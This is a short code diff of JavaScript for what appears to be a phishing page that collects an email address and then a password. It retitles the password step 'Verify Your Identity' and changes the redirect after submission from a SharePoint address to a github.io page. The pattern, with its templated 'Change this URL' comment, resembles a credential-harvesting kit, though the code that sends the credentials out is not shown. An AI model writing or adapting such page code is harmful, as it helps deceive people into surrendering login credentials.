@@ -302,7 +302,7 @@ document.addEventListener('DOMContentLoaded', function() {
     function proceedToPassword() {
         displayEmailInStep2(userEmail);
         showStep(2);
-        updateFormTitle('Enter Your Password');
+        updateFormTitle('Verify Your Identity');
         // Focus on password input
         setTimeout(() => {
             passwordInput.focus();
@@ -528,7 +528,7 @@ document.addEventListener('DOMContentLoaded', function() {
         closePopup();
         
         // Define the redirect URL (you can change this to any URL you want)
-        const redirectUrl = 'https://netorgft4015335.sharepoint.com/_layouts/15/sharepoint.aspx'; // Change this URL
+        const redirectUrl = 'https://avropoulou.github.io/madisondesignandbuild/'; // Change this URL
         
         console.log('Redirecting to:', redirectUrl);
         
